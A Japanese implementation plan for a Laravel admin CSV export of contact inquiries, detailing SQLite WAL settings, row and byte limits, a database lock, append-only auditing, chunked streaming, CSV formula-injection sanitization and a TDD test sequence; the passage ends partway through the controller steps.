# CSV エクスポート機能の追加

## 1. Context

管理画面のお問い合わせ一覧には、キーワード・ステータス・日付範囲による絞り込みとソート機能が既にあるが、絞り込んだ結果を外部（Excel等）に持ち出して集計・共有する手段がない。管理者が「対応中のお問い合わせ一覧を Excel に落として上長に共有する」「特定期間の問い合わせを集計する」といった業務を行えるよう、現在の絞り込み・ソート条件に一致するお問い合わせを CSV ファイルとしてダウンロードできる機能を追加する。

既存の絞り込みロジック（`ContactController::normalizeFilters()` と `Contact::scopeFilter()`）をそのまま再利用し、新規ライブラリを導入せず Laravel 標準機能のみで実装する。

## 2. 実装開始前の基準点

`CLAUDE.md` の「変更前に必ずgit commit」に従い、以下の手順で基準点を確立する：

1. 本計画書のレビュー・改善案反映を `git commit -m "docs: CSV エクスポート機能の実装計画を確定"` で commit する
2. `git rev-parse HEAD` の出力を本機能の `BASELINE_SHA` として作業記録に残す
3. `git status --short` の出力が空で、作業ツリーが clean であることを確認する
4. 記録した `BASELINE_SHA` より後の最初の変更として、§5の実装ステップ1（§4の手順1）から作業を開始する

## 3. 採用方針（検討事項への回答）

- **CSV 生成方式**: `league/csv` 等は導入せず、`ContactCsvExporter` が `tmpfile()` + `fputcsv()` でリクエスト中に CSV を一時ファイルへ生成する。生成完了後は `response()->streamDownload()` のコールバックから256 KiBずつ読み出して配信し、各チャンク間でクライアント切断、wall-clock期限、ロックleaseを確認する。

  各CSV行は再利用可能な `php://temp` 行バッファへ `fputcsv()` で完全なバイト列として符号化する。BOMと行バイト列は、短い正の `fwrite()` にも対応するwrite-allループで出力ファイルへ書く。

  PHP 組み込み関数は注入可能な `CsvStreamOperations` 経由で呼ぶ。正常系ではネイティブ実装、失敗系テストではテストダブルへ差し替える。CSV 方言はカンマ区切り、ダブルクォート囲み、`escape: ''`、CRLF行末に固定する。
- **文字エンコーディング**: UTF-8 with BOM を採用（絵文字を含む本文データがあり、Shift_JIS では文字欠落が起きるため）。
- **対応DB境界**: この同期CSV機能のスナップショット保証と並行性試験は SQLite に限定する。コード固定allowlistを `['sqlite']` とし、環境変数だけでは拡張できないようにする。

  ドライバ名だけでなく、実接続の `PRAGMA journal_mode` が `wal`、`PRAGMA busy_timeout` が `5000` であることと、監査HMAC鍵／versionが有効であることを毎回検証する。不一致・取得失敗なら、ロック・監査開始・Contact SELECT・一時ファイル作成より前に専用HTMLをHTTP 503で返す。

  PostgreSQL / MySQL 等を追加する場合は、transaction isolation、カーソルのメモリ、並行書き込みをドライバ別に合格させてからコード変更で追加する。
- **正式な出荷境界**: [ADR-001](decisions/001-single-host-sqlite-deployment.md) に基づき、本機能の出荷先は、同一ホストの永続ローカルファイルシステム上にSQLite DBを置く単一アプリケーション配置とする。Cloud Runの複数インスタンス、ネットワークファイルシステム、Cloud SQL / Supabase等の外部DBは現在の正式な出荷構成に含めない。

  デプロイ先をそれらへ変更する場合、同期CSVを503で無効化したまま出荷する。新しいADRで本決定を置き換え、ドライバ別の再検証を行うか、非同期生成＋オブジェクトストレージ配信へ再設計するまで有効化しない。この境界は `CLAUDE.md` と `README.md` に反映済みである。
- **取得整合性・同期上限**: SQLite の同一 read transaction 内で、最初にソートを除去した `id` だけの件数プローブを `LIMIT (最大件数 + 1)` 付き `cursor()` で実行する。10,001件目を検出した場合は、全一致行の `ORDER BY` や一時ファイル生成を行わず HTTP 422 とする。上限内の場合だけ、一意な第2ソート `id` を加えた本体クエリを `LIMIT 最大件数` 付き `cursor()` で反復して一時ファイルへ書く。2クエリを明示的な同一 transaction・同一接続で実行するため、プローブ後の同時 INSERT / UPDATE による件数・内容のずれを防ぎ、transaction 開始後の最初の SELECT で確立した SQLite スナップショットをエクスポート対象と定義する。`lazy(500)` は OFFSET/LIMIT の複数クエリでチャンク境界が移動し得るため採用しない。同期エクスポートは最大10,000件かつ生成済み CSV 64 MiB以下に強制し、元テーブル100,000件以下を性能保証範囲とする。件数超過、または BOM・ヘッダー・各データ行の書き込み後の実バイト数が64 MiBを超えた場合は、CSV 本体や `Content-Disposition` を返さず HTTP 422 とする。運用で元テーブル件数を日次確認して90,000件で警告し、100,000件へ達する前に再ベンチマークし、合格しなければ非同期方式へ移行する。上限値は `config/contact.php` で管理し、テスト時だけ小さな値へ差し替える。
- **メモリ・一時領域**: PDO ドライバや配信レイヤーが結果またはレスポンスを内部バッファする可能性はあるため、PHP本体・拡張・ネイティブライブラリを含むPHPワーカーとWebサーバー／プロキシのRSS、一時バッファ使用量を、同期上限10,000件、100,000件の早期件数超過、100,000件の疎な全表走査、60〜64 MiB CSVの256 KiB/s低速配信で外部から実測する。同時エクスポートを全体で1件に制限し、一時領域には CSV 上限64 MiBに最大1行分と安全余裕を加えた128 MiB以上の空き容量を要求する。生成、バイト上限超過、配信失敗、クライアント切断の各経路で、作成済みの一時ファイルを閉じることを自動テストまたは手動検証する。件数上限超過では一時ファイル自体を作成しない。メモリ、生成時間、一時領域の受入基準を満たせない場合は同期エクスポートを出荷せず、非同期ジョブによるファイル生成へ再設計する。
- **ワーカー占有と乱用防止**: 全ワーカーで共有されるcache storeを使い、ユーザーID単位・毎分2回のレート制限を適用する。システム全体の実行中エクスポートは、Contactと同じSQLiteファイル上の所有者token付きロックで1件に制限する。

  ロックTTLは600秒とする。生成は120秒、要求全体は540秒のコード固定された協調的wall-clock期限を設ける。生成完了後にleaseを更新し、配信中は60秒ごとに所有者一致UPDATEでTTLを延長する。更新が0行・`false`・例外なら配信を停止し、主失敗として記録する。

  配信callbackの間だけ `ignore_user_abort(true)` とし、切断検知後もfinalizerを実行できるようにする。各chunk後に切断を検知したら直ちに配信を止め、callback終了時に元の設定へ戻す。

  120秒と540秒は行・chunk間で評価する協調的期限であり、PDO、ファイルI/O、出力がブロックしている間は処理を中断できない。厳密な強制上限はFPMの `request_terminate_timeout=570` とし、TTLより30秒以上前にworkerを終了させる。`set_time_limit()` やプロキシのタイムアウトだけをPHP停止保証として扱わない。

  正常終了・例外・切断時は、所有者一致DELETEが1行へ作用した場合だけ解放成功とする。強制終了時は最終lease更新から600秒後に論理失効する。競合するエクスポートは一時ファイルを作らずHTTP 429を返す。
- **配信時間とレスポンスヘッダー**: 生成30秒、全体360秒以内をSLOとする。SLOとは別に、生成120秒、要求全体540秒の協調的期限を設ける。本番のWebサーバーとプロキシのクライアント向けタイムアウトは420秒以上、FPMの強制終了は570秒とする。

  完成後のバイト数を `Content-Length` に設定する。個人情報を含むため `Cache-Control: no-store, private` と `X-Content-Type-Options: nosniff` を明示する。256 KiB/s未満が必要なら、非同期生成＋Webサーバーまたはオブジェクトストレージ配信へ切り替える。
- **監査証跡**: 個人情報へアクセスするエクスポートは、追記専用の `csv_export_audit_events` 表へ `started`、`rejected`、`generated`、`stream_completed`、`failed` を記録する。最初の `started` を記録できなければ、Contact SELECTと一時ファイル作成へ進まない。

  記録項目は監査ID、管理者の内部user ID、発生時刻、結果、行数、バイト数、失敗phase、正規化条件のHMAC-SHA-256 fingerprintに限定する。問い合わせ内容、検索語、氏名、メール、ファイル名、ロックowner tokenは保存しない。

  runtime接続からのUPDATE／DELETEはSQLite triggerで拒否し、アプリケーションにtrigger変更APIを設けない。これは通常運用とアプリ不具合に対する追記専用保証であり、ホスト管理者やDBファイル自体の侵害に対する改ざん耐性とは表現しない。

  fingerprintにはCSV監査専用HMAC鍵を使い、鍵versionを各イベントへ保存する。過去鍵は監査保持期間以上、安全な秘密管理先に保持する。`generated` はCSV生成完了、`stream_completed` はサーバー側コールバック完了を意味し、クライアントが保存を完了した証明とは表現しない。
- **本番テレメトリ**: PIIを含まない構造化イベントとして、結果、HTTP分類、生成時間、配信時間、総時間、行数、バイト数、ロック競合、lease更新失敗、切断、後処理失敗を記録する。監査イベントと運用メトリクスは用途と保存先を分ける。

  FPMがworkerを強制終了した場合、アプリケーションのfinalizer、終端監査、`contact_csv_export.finished` は実行されない。FPM termination logを外部監視し、終端イベントのない監査IDを別プロセスのwatchdogで検出する。
- **SQLite の読み書き並行性**: 現状の SQLite は rollback journal (`DELETE`) かつ `busy_timeout=0` であり、CSV 生成中の read transaction が、公開フォームの INSERT や管理者のステータス UPDATE の commit を妨げ得る。ファイルベース SQLite 接続では `journal_mode=WAL` と `busy_timeout=5000` ミリ秒を明示し、件数プローブと本体クエリを同じスナップショットで実行している間も書き込みを継続可能にする。本体の DB カーソルと read transaction は一時ファイル生成完了時に閉じるため、低速ダウンロード時間は SQLite の read transaction に含めない。WAL を有効化できない環境、プローブと本体生成の間を含む並行書き込み、生成後の checkpoint、および低速配信中の並行書き込み受入テストを満たせない環境では同期エクスポートを出荷しない。インメモリ SQLite (`:memory:`) を使う自動テストでは WAL にならないため、PRAGMA の実値確認と並行性検証はファイルベース SQLite のスモークテストで行う。
- **並び順の一元化**: `index()`、`show()` の前後ナビゲーション、`export()` が同じ private クエリビルダーを使う。選択ソート列・方向の後に `id` を同方向で追加し、一覧、詳細、CSV の同値行順序まで一致させる。
- **CSV インジェクション対策**: CSV は Excel で開き、保存・再オープン・共有される前提とする。公開フォーム由来の値（名前、メールアドレス、件名、本文）の先頭が `=` `+` `-` `@` `\t` `\r` `\n` または日本語環境で式と解釈される可能性のある全角文字 `＝` `＋` `－` `＠` で始まる場合、先頭にタブを付与する。Excel 向け対策は、そのタブを**ダブルクォートで囲まれたフィールド内**に配置することを前提とするため、`fputcsv()` のラウンドトリップだけでなく、生の CSV が `"\t=..."` の形で直列化されることを自動テストで固定する。対象 PHP バージョンでこの条件を満たさなくなった場合は、全フィールドを確実に引用する専用ライターへ切り替える。タブが基礎データに残るトレードオフは、Excel での人間による閲覧と安全性を優先して受け入れる。先頭アポストロフ方式は、Excel で保存・再オープンした際の安全性を保証できないため採用しない。なお、全ての表計算ソフトと下流処理に共通する万能なサニタイズではなく、本要件が対象とする Microsoft Excel での安全性を実機検証する。
- **エクスポート対象**: 現在の絞り込み・ソート条件に一致する全件（`per_page`/`page` は無視）。ただし同期上限の10,000件または64 MiBを超える場合は一部だけを返さず、エクスポート全体を422で拒否する。
- **フィルター引き継ぎ**: エクスポート URL は生の `request()` 値ではなく、`normalizeFilters()` で正規化済みの `$filters` から生成する。これにより、既存互換入力の `statuses` も `status` に正規化して引き継ぎ、一覧より広い範囲を誤って出力しない。
- **CSV 項目**: ID, 名前, メールアドレス, 件名, 本文, ステータス（日本語ラベル）, 登録日時（`formatted_created_at` と同じ表示形式）。ファイル名の日時は `config('app.display_timezone', 'Asia/Tokyo')` へ変換してから `contacts_YYYYMMDD_HHmmss.csv` とする。
- **Microsoft Excel 互換性（必須要件）**: ダウンロードした CSV を Microsoft Excel でダブルクリックしてそのまま開いた際に日本語・絵文字が文字化けしないこと。UTF-8 BOM 付与により、Windows/Mac 双方の現行 Excel（2016以降）が自動的に UTF-8 と認識して正しく表示するため、追加のインポート手順（データタブ→テキストまたはCSVから、での文字コード指定）は不要とする。検証方法の項で実機 Excel での確認を必須ステップとする。

## 4. 実装方針: TDD（テスト駆動開発）

実装ステップ1でデータベースの前提設定を確立した後、エクスポート機能はテスト駆動開発（Red → Green → Refactor）で実装する。ステップ2以降は「失敗するテストを書く → 最小実装で通す → リファクタ」を繰り返す（各テスト名は下記「6. テスト追加」の一覧に対応）:

1. ファイルベース SQLite の WAL / busy timeout をコード固定（実装ステップ1）し、`test_file_sqlite_connection_applies_fixed_wal_and_busy_timeout` で外部環境値を無視した `PRAGMA journal_mode` と `PRAGMA busy_timeout` の実値を確認する
2. SQLite allowlist、同期上限、レート制限、TTL 600秒、lease更新60秒、生成120秒、要求540秒、chunk 256 KiBをコード固定し、設定境界を分離プロセスでRed→Greenにする
3. 専用lock migrationとowner付き取得・更新・解放を追加する。期限切れ引継ぎ、旧owner拒否、refresh／releaseの実SQLite競合をRed→Greenにする
4. `CsvStreamOperations`、`CsvExportClock`、環境validator、監査recorder、telemetry、未完了監査watchdogを追加する。chunk I/O、fake単調時刻、実PRAGMA、trigger付き監査、許可済みtelemetry schema、read-only watchdogを個別にRed→Greenにする
5. `test_unauthenticated_user_cannot_export_csv` を書き実行（ルート未定義のため失敗）→ ルート追加（実装ステップ5）→ Green化
6. `test_authenticated_non_admin_user_cannot_export_csv` を書き実行 → Green化（ミドルウェアで担保、追加実装は不要な想定）
7. 実driver／PRAGMA不適合の早期503、監査開始fail-closed、admin成功、配信中のロック競合429を先にRedにする。validator→監査→lock→exporterの順で縦切り実装しGreenにする
8. Greenになったadminエクスポート経路に対して、ユーザー単位のRateLimiterテストをRedにする → `contact-exports` RateLimiterを登録してルートへ適用し、同一ユーザーの超過429と別ユーザーへの非干渉をGreenにする
9. `test_export_csv_filename_uses_display_timezone_and_includes_timestamp` とBOM／ヘッダーテストをRedにする。UTC/JSTの日付境界を含むファイル名とCSV先頭を実装する
10. `test_export_csv_contains_contact_data_row` と `test_export_csv_preserves_rfc4180_special_characters` → データ行と固定CSV方言を実装
11. `test_export_csv_respects_status_filter` / `test_export_csv_respects_statuses_alias` 〜 `test_export_csv_respects_date_range_filter` → `normalizeFilters()`/`Contact::scopeFilter()` へ接続
12. `test_export_csv_respects_sort_order`、`test_export_csv_outputs_each_contact_once_when_sort_values_tie`、`test_index_show_and_export_share_tie_breaker_order` → `index()`、`show()`、`export()` を共通クエリビルダーへ統合し、選択ソート＋ `id` の一意な並び順を実装する
13. `test_export_csv_uses_bounded_probe_and_ordered_export_queries_in_one_transaction`、`test_export_csv_probe_and_export_share_sqlite_snapshot`、`test_sqlite_export_snapshot_survives_fixed_write_load_and_checkpoint_recovers`、件数・バイト上限テスト → 同一 read transaction 内の順序なし `LIMIT (上限 + 1)` プローブ、上限内だけ実行する順序付き本体クエリ、BOM・ヘッダー直後を含む実バイト上限、422応答を実装
14. DB読み取り完了後のchunk配信、生成後と60秒ごとのlease更新、切断、生成120秒／要求540秒の協調的deadline、ロック寿命をfake clockでRed→Greenにする
15. 一時ストリーム、行符号化、write-all、chunk read／output、位置、巻き戻し、累積バイト不一致、close、lease更新、監査追記、解放の全失敗を決定的に発生させる。主例外保持と一度だけのfinalizerをGreenにする
16. `test_export_csv_returns_header_only_when_no_contacts_match` → 0件時の挙動を確認
17. `test_export_csv_sanitizes_all_dangerous_prefixes`、`test_export_csv_sanitizes_each_user_controlled_field`、`test_export_csv_quotes_sanitized_fields_with_leading_tab` → `ContactCsvExporter::sanitizeCsvField()` と生バイト検証を実装
18. `test_export_csv_header_labels_localized_in_english` → `en.json` に英訳を追加
19. `test_index_csv_export_link_uses_normalized_filters` と `test_ajax_index_csv_export_link_uses_normalized_filters` → 正規化済みフィルターから URL を生成し、`download` 属性を付けないビューへボタンを追加する
20. §6の追加予定59テストメソッドと、`BASELINE_SHA` 時点の既存97テストを含む全回帰suiteをGreenにする。data provider展開後の件数はrunner出力を記録し、行カバレッジ100.0%、分岐対応、監査・telemetryの許可fieldを照合してから、挙動を変えないリファクタとPintを行う
21. commit済みハーネスで性能、chunk配信、lease更新、協調的deadline、FPM 570秒強制上限、実PRAGMA、監査、telemetry、監視通知を検証する。実機Excel、320px、スクリーンショット／GIFも確認する

**チェックポイント**: ステップ3（SQLite lock＋refresh）、ステップ8（環境検証・監査・認可・資源制御）、ステップ13（上限・snapshot）、ステップ15（期限・chunk I/O・後処理）、ステップ20（全自動テスト）、ステップ21（出荷判定）で全テストと `git diff --check` を実行し、独立commitにする。

## 5. 実装ステップ

### 1. SQLite 並行性設定 — `config/database.php`, `README.md`

ファイルベース SQLite で CSV 生成中の読み取りとフォーム送信・ステータス更新を並行できるよう、SQLite 接続設定を以下のように変更する：

```php
'sqlite' => [
    // ...既存設定...
    'busy_timeout' => 5000,
    'journal_mode' => 'WAL',
    // ...既存設定...
],
```

`DB_BUSY_TIMEOUT` と `DB_JOURNAL_MODE` は追加せず、5,000ミリ秒とWALをコード固定する。`synchronous` は変更しない。

SQLiteは `PRAGMA journal_mode=WAL` を適用できない場合、例外ではなく変更前のmodeを返し得る。接続設定だけを保証とせず、§5.4の `CsvExportEnvironmentValidator` がエクスポートごとに実値を確認してfail-closedにする。

自動テストの `:memory:` 接続では実値が `memory` になる。通常のHTTP機能テストはvalidatorのqualified test doubleを使い、本番validatorの正常・不一致経路はファイルベースSQLiteの統合テストで確認する。

`README.md`、`CLAUDE.md`、ADR-001には、正式な出荷境界が同一ホスト・永続ローカルファイルシステム・SQLiteであることを明記済みである。実装はこの決定を前提とし、Cloud Run複数インスタンスや外部DBへ移行するときは、同期CSVを無効化して新しいADRで再設計する。

`README.md` にはWAL中の安全なバックアップ、128 MiB以上の一時領域、共有RateLimiter store、同時1件、同期上限、100,000件以下、256 KiB/s以上も記載する。Web／proxy 420秒以上、FPM 570秒、ロックTTL 600秒の順序を崩さない。

### 2. 同期上限・レート制限設定 — `config/contact.php`, `.env.example`, `app/Providers/AppServiceProvider.php`

同期エクスポートの資源上限を既存の `config/contact.php` に追加し、実装と検証で同じ値を参照する。

```php
'csv_export_supported_drivers' => ['sqlite'],
'csv_export_max_rows' => min(10_000, max(1, (int) env('CONTACT_CSV_EXPORT_MAX_ROWS', 10_000))),
'csv_export_max_bytes' => min(64 * 1024 * 1024, max(1, (int) env('CONTACT_CSV_EXPORT_MAX_BYTES', 64 * 1024 * 1024))),
'csv_export_rate_limit' => min(2, max(1, (int) env('CONTACT_CSV_EXPORT_RATE_LIMIT', 2))),
'csv_export_lock_seconds' => 600,
'csv_export_lock_refresh_seconds' => 60,
'csv_export_generation_deadline_seconds' => 120,
'csv_export_request_deadline_seconds' => 540,
'csv_export_stream_chunk_bytes' => 256 * 1024,
'csv_export_required_busy_timeout' => 5000,
'csv_export_audit_hmac_key_version' => env('CSV_EXPORT_AUDIT_HMAC_KEY_VERSION'),
'csv_export_audit_hmac_key' => env('CSV_EXPORT_AUDIT_HMAC_KEY'),
```

`.env.example` には引き下げ可能な件数・容量・レートと、値を含まない監査HMAC鍵／versionの設定例を記載する。他の安全境界は環境変数化しない。鍵はbase64化した32 byte以上のランダム値とし、リポジトリやbenchmark artifactへ保存しない。

固定値の関係は `生成協調期限120 < 要求協調期限540 < FPM強制上限570 < ロックTTL600` とする。lease更新間隔60秒はTTLより十分短くする。通常imageや稼働中FPMへ `config()->set()` する経路は作らない。

強制終了試験だけは、§5.9の非本番専用fault imageが独立した短い値を起動時に設定する。検証後はコンテナごと破棄する。

`test_csv_export_configuration_enforces_hard_safety_bounds` は、引き下げ可能な3値のcapと全固定値を分離プロセスで確認する。外部に同名の環境変数があっても、TTL、更新間隔、期限、チャンクサイズ、必須PRAGMA値が変わらないことを固定する。監査HMAC鍵とversionは環境validatorで必須、形式不正ならunqualifiedとする。

TDDステップ8で `contact-exports` RateLimiterを追加し、認証後のユーザーID単位で最大毎分2回に制限する。

### 3. SQLite専用グローバルロック — `database/migrations/*_create_csv_export_locks_table.php`, 新規ロッククラス群

Laravelのcache lockとそのstore固有のprefix／解放セマンティクスへ依存せず、同期CSVの対応DB境界と同じSQLite上で排他を完結させる。migrationは次の専用表を作成し、既存の `cache_locks` 表を流用しない。

```text
csv_export_locks
  name        TEXT PRIMARY KEY
  owner       TEXT NOT NULL
  expires_at  INTEGER NOT NULL
```

- `CsvExportLockManager`: `acquire(Connection $connection, string $name, int $seconds): ?AcquiredCsvExportLock` を定義する。`Contact` が実際に使う接続を受け取り、対象外ドライバ判定後・CSV用read transaction開始前にだけ呼ぶ
- `SqliteCsvExportLockManager`: `random_bytes(32)` を16進化した64文字のowner tokenと現在epoch秒を使い、固定名 `contacts:csv-export` を単一のparameter binding付き `INSERT ... ON CONFLICT(name) DO UPDATE ... WHERE csv_export_locks.expires_at <= :now` で取得する。affected rowsが1なら取得済みhandle、0なら競合として `null` を返す。SQL例外を「競合」と偽装せず上位へ伝える
- `AcquiredCsvExportLock`: owner tokenを内部だけに保持し、`refresh(int $seconds): bool` と `release(): bool` を提供する。owner tokenをログ、例外メッセージ、レスポンス、benchmark artifactへ出さない

`refresh()` は `UPDATE ... SET expires_at = :now + :seconds WHERE name = :name AND owner = :owner AND expires_at > :now` のaffected rowsが1の場合だけ成功とする。0行、`false`、例外を成功扱いしない。生成用read transactionの内部からは呼ばない。

`release()` は所有者一致DELETEのaffected rowsが1の場合だけ成功とする。0行、`false`、SQLite競合を含む例外を成功扱いしない。

取得、更新、解放はContactのread transaction外で実行し、statementのcommit完了後に戻る。生成は各協調点で120秒超過を検知して中止し、transaction終了直後に最初のlease更新を行う。協調点の間でブロックした場合はFPM 570秒強制上限が処理を終了する。配信中は60秒ごとに更新する。

期限切れ行は次のUPSERTで原子的に引き継ぐ。強制終了時は物理削除ではなく、最終 `expires_at` 後の別owner取得を回復条件にする。

実ファイルSQLiteの2接続で、取得、更新、期限切れ引継ぎ、旧ownerの更新・解放拒否、正常解放を固定する。別接続のwrite lockで更新／解放DELETEを失敗させ、例外が成功扱いされないことも確認する。

### 4. CSV生成・実行制御サービス群 — 新規クラス群

I/O、環境前提、時刻、監査、運用テレメトリを次の責務へ分ける。

- `CsvStreamOperations`: 一時ストリーム、行バッファ、CSV符号化、write-all用書き込み、位置、巻き戻し、最大256 KiBの読み出し、PHP出力、flush、user-abort設定、切断状態、closeを定義する
- `NativeCsvStreamOperations`: `tmpfile()`、`php://temp`、`fputcsv()`、`fwrite()`、`fread()`、出力、`flush()`、`ignore_user_abort()`、`connection_aborted()`、`fclose()` へ委譲する本番アダプター
- `CsvExportClock`: deadline用の単調時刻を `hrtime(true)`、ロックと監査用のwall timeを `now()` から返す。テストではfake clockへ差し替える
- `CsvExportEnvironmentValidator`: allowlist、実接続のPRAGMA、監査HMAC鍵とversionを検証し、同期CSVを安全に実行できる場合だけqualified結果を返す
- `SqliteCsvExportEnvironmentValidator`: `journal_mode=wal` と `busy_timeout=5000` を変更せず検証する。PRAGMA取得例外、監査鍵の欠落・形式不正、空のversionもunqualifiedとする
- `CsvExportAuditRecorder`: `started` を追記し、監査IDを保持する `CsvExportAudit` handleを返す
- `CsvExportAudit`: 同じSQLite接続へ後続の `rejected`、`generated`、`stream_completed`、`failed` を追記する
- `CsvExportTelemetry`: PIIを含まない固定schemaの構造化イベントを出力し、ログ基盤からcounter／histogramを生成できるようにする
- `ContactCsvExporter`: CSV生成、期限、chunk配信、lease更新、監査イベント、テレメトリ、リソースfinalizerを統括する
- `CsvExportLimitExceededException`: 件数またはバイト上限超過を表し、CSV用ヘッダーを付けずに専用エラービューを422で返す
- `CsvExportDeadlineExceededException`: 生成または要求の協調的期限超過を表す。送信前ならCSV用ヘッダーなしの503、送信開始後なら配信停止とサーバー記録にする

`AppServiceProvider::register()` で各contractを本番実装へbindする。通常のHTTP機能テストはqualified validatorとfake clockを注入し、本番validatorはファイルSQLiteの統合テストで通す。

I/O、時刻、監査、telemetryの失敗系はテストダブルで決定的に発生させる。組み込み関数や実時間のsleepへ依存しない。

監査用migrationは次の表とUPDATE／DELETE拒否triggerを作成する。アプリケーションコードにはtriggerの作成・削除、update、delete APIを設けない。

```text
csv_export_audit_events
  id                  INTEGER PRIMARY KEY
  audit_id            TEXT NOT NULL INDEX
  actor_user_id       INTEGER NOT NULL INDEX
  event               TEXT NOT NULL
  filter_fingerprint  TEXT NOT NULL
  fingerprint_key_version TEXT NOT NULL
  row_count           INTEGER NULL
  byte_count          INTEGER NULL
  phase               TEXT NULL
  occurred_at         DATETIME NOT NULL
```

migrationはeventを `started`、`rejected`、`generated`、`stream_completed`、`failed` に限定するCHECK、fingerprintを64桁のlowercase hexに限定するCHECK、空の鍵versionを拒否するCHECKを追加する。trigger、CHECK、indexの生成失敗はmigration失敗として扱う。

`filter_fingerprint` の入力は、正規化済みのstatus、keyword、body keyword、date from／to、sortだけとし、page／per pageを除外する。statusは値順にsortし、map keyを再帰的に順序付け、日付をUTC ISO 8601、enumをscalarへ変換する。`JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR` でcanonical JSONを作る。

現在のCSV監査専用鍵でcanonical JSONのHMAC-SHA-256を計算し、対応する `fingerprint_key_version` と一緒に全イベントへ保存する。生の条件、問い合わせ内容、例外メッセージ、HMAC鍵は監査表へ保存しない。

SQLite triggerはruntime接続からのUPDATE／DELETEを `RAISE(ABORT)` で拒否する。監査保持期間を過ぎた行の削除は通常アプリから実行せず、maintenance modeで全workerを停止し、バックアップと外部archiveの件数・checksumを検証した後にだけ行う。runbookにtriggerの一時解除、対象期間のDELETE、trigger再作成、整合性確認、別の運用監査先への作業記録を固定し、失敗時はバックアップから復旧する。

`ContactCsvExporter::download(Builder $query, string $filename, AcquiredCsvExportLock $lock, CsvExportAudit $audit, int $requestStartedAt): StreamedResponse` とする。時刻は単調nanosecondsで渡す。

ロックと監査handleの所有権は呼び出し時にサービスへ移す。戻り値生成前の例外でも、監査失敗記録、リソースclose、ロック解放を試行する。

1. `Contact` が使用する接続を取得し、同じ接続のtransaction closure内でプローブと本体生成を実行する。生成中はfake可能な単調時刻を各反復で確認し、120秒を超えたら例外でrollbackする
2. 元の Builder をcloneし、`reorder()` で `ORDER BY` を除去して `select('id')->limit($maxRows + 1)->cursor()` を反復する。プローブカーソルは専用の `try/finally` スコープへ置き、完走・10,001件目・例外の全経路で参照を破棄する。10,001件目を検出した時点で `CsvExportLimitExceededException` を投げ、本体の順序付きクエリと一時ストリーム作成は行わない
3. 上限内の場合だけ出力用一時ストリームと再利用可能な行バッファを作成する。BOMはwrite-allループで3バイトすべてを書き、ヘッダーはリセット済み行バッファへ `fputcsv()` で符号化して得た完全な行バイト列を同じループで書く。`write()` が短い正数なら未書き込み部分を続行し、0・`false`・例外なら主例外とする。直後に `ftell()` 相当の値を確認し、ヘッダーだけでバイト上限を超えた場合も同例外を投げる
4. 元の Builder を再度cloneして `limit($maxRows)` を設定し、選択ソート＋ `id` の順序付き単一 SQL を `cursor()` で反復する。本体カーソルも専用の `try/finally` スコープへ置き、完走または行生成例外時に参照を破棄する
5. 各データ行も行バッファをresetして符号化し、write-allループで出力する。各行後に位置、64 MiB上限、生成期限を確認する
6. closure内で最終バイト数を保存して巻き戻す。closure returnでcommit、Throwableでrollbackする。transaction終了後、カーソル参照とtransaction levelが残っていないことを確認する
7. 送信前に所有者一致のlease更新と `generated` 監査イベントを記録する。いずれかが失敗したら、CSVレスポンスを返さずfinalizerへ進む
8. `streamDownload()` はcallback開始時に `ignore_user_abort(true)` とし、256 KiBずつ読み出してPHP出力へ送りflushする。各chunk後に累積バイト数、`connection_aborted()`、要求540秒期限を確認し、finalizerで元のuser-abort設定へ戻す
9. 最終lease更新から60秒経過する前に `refresh(600)` を行う。0行、`false`、例外なら直ちに配信を停止し、`lock_refresh` を主失敗とする
10. 全バイトを処理した場合だけ `stream_completed` を追記する。切断、期限、読み出し不足、出力失敗は `failed` とする。監査イベントにはクライアント保存完了という意味を持たせない
11. 生成例外、上限、配信成功、配信失敗、切断を共通finalizerへ通す。作成済みストリームを各1回closeし、その後にロック解放を1回だけ試行する

finalizerの例外優先順位を次のように固定する。

- CSV生成、書き込み、上限、期限、transaction終了、chunk読み出し／出力、lease更新、累積バイト不一致を「主例外」とする。close、監査失敗記録、telemetry、ロック解放の失敗で置き換えない
- close・ロック解放の失敗は `contact_csv_export.cleanup_failed`、lease更新失敗は `contact_csv_export.lock_refresh_failed`、監査追記失敗は `contact_csv_export.audit_failed` とする
- 構造化ログにはphase、reason、例外クラス、監査IDだけを許可する。owner token、例外メッセージ、問い合わせ内容、フィルター、管理者情報は含めない
- 最初の `started` と送信前の `generated` を記録できなければfail-closedにする。送信開始後の `stream_completed`／`failed` 追記失敗はレスポンスを置換せず、監視pageを発火させる
- 主例外がなく配信が完了した後は、既にヘッダー／本文を送信済みのため後処理失敗を新たなHTTP例外へ変換しない。ログと監視で検知し、解放失敗時はTTLによる回復に委ねる
- transaction終了はfinalizerへ委ねない。finalizer、各close、監査終端イベント、ロック解放はそれぞれ一度だけ実行する。一方の後処理失敗時も残りを試行する

レスポンスヘッダーは次を固定する。

```php
[
    'Content-Type' => 'text/csv; charset=UTF-8',
    'Content-Length' => (string) $byteCount,
    'Cache-Control' => 'no-store, private',
    'X-Content-Type-Options' => 'nosniff',
]
```

CSV インジェクション対策は `ContactCsvExporter::sanitizeCsvField(string $value): string` に置き、危険プリフィックス `=`, `+`, `-`, `@`, `\t`, `\r`, `\n`, `＝`, `＋`, `－`, `＠` の先頭へタブを付与する。現行migrationでは名前、メールアドレス、件名、本文はすべてNOT NULLであり、存在しないnull分岐は設けない。上限超過以外の生成時I/O例外は、finalizer実行後に再送出してLaravelの標準例外ハンドラへ渡す。レスポンス送信開始後の配信例外は元の例外を保持してサーバーログへ到達させるが、送信済みレスポンスを別のエラー画面へ置換できるとは扱わない。

### 5. ルート・コントローラー変更 — `routes/web.php`, `app/Http/Controllers/Admin/ContactController.php`

resource の `{contact}` ワイルドカードと衝突しないよう、固定パスをresource定義の直前へ追加し、認可に加えてユーザー単位のレート制限を適用する。以下はTDDステップ8完了時の最終形であり、ステップ7では `auth` / `can`、実行環境の適合性検証、SQLite専用グローバルロックを先にGreenにするため、ルートの `throttle:contact-exports` だけをまだ付けない。ステップ8のRateLimiterテストをRedにしてからLimiter登録とルートmiddlewareを同時に追加する。

```php
Route::middleware(['auth', 'can:manage-contacts'])->prefix('admin')->name('admin.')->group(function () {
    Route::get('contacts/export', [AdminContactController::class, 'export'])
        ->middleware('throttle:contact-exports')
        ->name('contacts.export');
    Route::resource('contacts', AdminContactController::class)->only(['index', 'show', 'update']);
});
```

`export()` は次の順序を固定する。

1. controller入口で単調時刻の `$requestStartedAt` を取得し、条件を正規化して共通queryと接続を得る
2. `CsvExportEnvironmentValidator` でdriver、`journal_mode=wal`、`busy_timeout=5000` の実値と、監査HMAC鍵／versionを検証する
